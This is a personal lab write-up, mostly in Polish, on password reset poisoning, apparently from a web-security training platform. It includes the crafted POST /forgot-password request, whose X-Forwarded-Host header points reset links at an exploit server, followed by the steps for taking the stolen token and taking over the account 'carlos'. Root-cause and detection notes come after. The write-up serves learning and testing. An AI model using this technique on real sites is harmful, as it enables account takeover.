```
LAB: Password reset poisoning via middleware  
Kategoria: Authentication / Host Header Injection  
Utworzono: 2026-04-22 18:05 (Europe/Amsterdam)

---

## 1. SCAN (Entry & Signals)
Endpoint:
- POST /forgot-password

Controllable input:
- headers (X-Forwarded-Host / Host / X-Host)
- username

Signals:
- reset password flow
- token w URL (temp-forgot-password-token)
- link wysyłany do usera (email client)
- aplikacja za proxy (forwarded headers obecne)

---

## 2. LOCK (Vector)
Vector:
- X-Forwarded-Host

Why this:
- backend używa headera do budowy absolutnego URL

---

## 3. PRESS (Exact Steps)
1. Otwórz forgot password
2. Wpisz: carlos
3. Przechwyć request i dodaj header

Payload / request:
POST /forgot-password HTTP/2
Host: <lab-id>.web-security-academy.net
X-Forwarded-Host: <exploit-id>.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos

---

## 4. BREAK (Proof)
- Email zawiera link do exploit-server (nie do laba)
LUB
- request ofiary trafia do exploit server (Access log)

Dowód:
GET /forgot-password?temp-forgot-password-token=XYZ

---

## 5. POST (Exploit Path)
1. Wejdź w Exploit server → Access log
2. Skopiuj token z requesta
3. Otwórz:
   /forgot-password?temp-forgot-password-token=XYZ na labie
4. Ustaw nowe hasło dla carlos
5. Login → takeover

Final effect:
- account takeover (carlos)

---

## 6. ROOT CAUSE
- backend buduje URL z:
  X-Forwarded-Host / Host
- brak walidacji hosta

Trust break:
- user-controlled header → security-sensitive URL

---

## 7. PATTERN (Reusable)
Name:
- Password reset poisoning / Host header injection

Conditions:
- token w URL
- link wysyłany userowi
- URL budowany dynamicznie z requesta
- brak whitelisty hosta

---

## 8. PITFALLS (My mistakes)
- skupienie na emailu zamiast URL
- użycie złego usera (wiener zamiast carlos)
- patrzenie na response zamiast mail/logów
- mylenie /email endpoint z mechanizmem resetu

---

## 9. DETECTION (Fast trigger)
Scan cues:
- reset / activation / login link
- absolutne URL w mailach
- obecność forwarded headers

Szybkie testy:
- dodaj X-Forwarded-Host → sprawdź gdzie prowadzi link
- sprawdź exploit server logi

---

## 10. REPLAY (🔥)
1. znajdź /forgot-password
2. wyślij dla carlos
3. dodaj X-Forwarded-Host: exploit-server
4. sprawdź access log → token
5. użyj tokena → reset → login

---

## 11. TAKEAWAY
Aplikacja wysyła token resetu na domenę kontrolowaną przez atakującego przez zaufanie do headerów.
```
